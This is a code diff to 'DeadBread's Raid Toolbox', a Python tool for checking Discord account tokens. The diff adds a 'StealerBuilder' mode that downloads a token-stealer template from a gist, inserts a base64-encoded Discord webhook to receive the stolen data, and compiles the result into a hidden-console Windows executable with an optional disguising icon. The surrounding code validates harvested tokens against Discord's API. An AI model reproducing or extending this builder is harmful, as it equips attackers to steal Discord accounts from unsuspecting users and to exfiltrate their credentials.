@@ -17,7 +17,7 @@
 # OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN
 # CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 
-import os, sys, ast, json, time, random, subprocess, requests, shutil
+import os, sys, ast, json, time, random, base64, subprocess, requests, shutil
 from itertools import cycle
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
@@ -248,7 +248,7 @@ elif mode == "Checker V2":
     sg.PopupTimed("Checking Tokens...", title="DeadBread's Raid Toolbox | Checker V2", non_blocking=True)
     def checkv2(token):
         headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
-        src = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
+        src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
         if "401: Unauthorized" in str(src.content):
             invalidtokens.append(token)
         else:
@@ -1257,6 +1257,75 @@ elif mode == 'quickcheck':
             print(colored(token + " Unverified","yellow"))
             with open ("quick_checked_tokens_unverified.txt", "a+") as handle:
                 handle.write(token+"\n")
+
+elif mode == "StealerBuilder":
+    if not sys.platform.startswith("win32"):
+        sg.Popup("Only Supported on windows as of now. Sorry.", title="Yikes")
+        os.kill(os.getpid(), 15)
+    if not os.path.exists("RTBStealerBuilder/"):
+        os.mkdir("RTBStealerBuilder/")
+    def build():
+        global name
+        global webhook
+        global useicon
+        global icon
+        global Window
+        os.chdir('RTBStealerBuilder/')
+        pyname = name+'.py'
+        temp = requests.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/2eb4210c0fa37a5f0bc2462c0a960fe6eaf2e307/stealertemplate.py").text
+        with open("template.py", "w+") as handle:
+            handle.write(temp)
+        with open("template.py") as f:
+            lines = f.readlines()
+        os.remove("template.py")
+        with open(pyname, "w") as f:
+            lines.insert(12, "webhook = '{}'\n".format(webhook))
+            f.write("".join(lines))
+        print("Building EXE, Please wait...")
+        window.Refresh()
+        if useicon:
+            compiling = subprocess.Popen(['pyinstaller','--noconsole',pyname,'--icon='+icon,'-F'],shell=True,stdout=open("../errors.log", "a"), stderr=subprocess.STDOUT)
+        else:
+            compiling = subprocess.Popen(['pyinstaller','--noconsole',pyname,'-F'],shell=True,stdout=open("../errors.log", "a"), stderr=subprocess.STDOUT)
+        compiling.wait()
+        print("EXE built, Cleaning up...")
+        window.Refresh()
+        shutil.rmtree('build')
+        for root, dirs, files in os.walk('dist'):
+            for file in files:
+                if file == ('{}.exe'.format(name)):
+                    os.rename('dist/{}'.format(file), '{}.exe.'.format(name))
+        shutil.rmtree('dist')
+        os.remove('{}.spec'.format(name))
+        print("Finished!")
+        window.Refresh()
+    layout = [
+            [sg.Text('Output Name', size=(10, 1)), sg.Input(size=(10, 1))],
+            [sg.Text('Webhook', size=(10, 1)), sg.Input(size=(50, 1)), sg.Checkbox('Use Icon?')],
+            [sg.Text('Icon', size=(10, 1)), sg.InputText(size=(50, 1)), sg.FileBrowse(button_color=theme['button_colour'])],
+            [sg.Output(size=(80, 20))],
+            [sg.Button('Build', size=(35, 1), button_color=theme['button_colour']), sg.Exit(size=(35, 1), button_color=theme['button_colour'])]
+            ]
+    window = sg.Window("DeadBread's Token Stealer Builder v 0.1.1", layout)
+
+    while True:
+        event, values = window.Read()
+        if event is None or event == 'Exit':
+            break
+        if event == "Build":
+            if values[0] == '':
+                sg.PopupNonBlocking('Invalid Name!')
+                continue
+            if values[1] == '':
+                sg.PopupNonBlocking('No webhook entered!')
+                continue
+            name = values[0]
+            webhook = base64.b64encode(values[1].encode()).decode()
+            useicon = values[2]
+            icon = values[3]
+            build()
+    window.Close()
+
 
 elif mode == 'ree':
     picdata = requests.get("https://gist.githubusercontent.com/DeadBread76/3d93e55fe4a9e4c7324c2f0b13cf24ac/raw/7d433bb5187c5d2c1fc74c310ff0638790491c87/Special%2520surprise.txt")
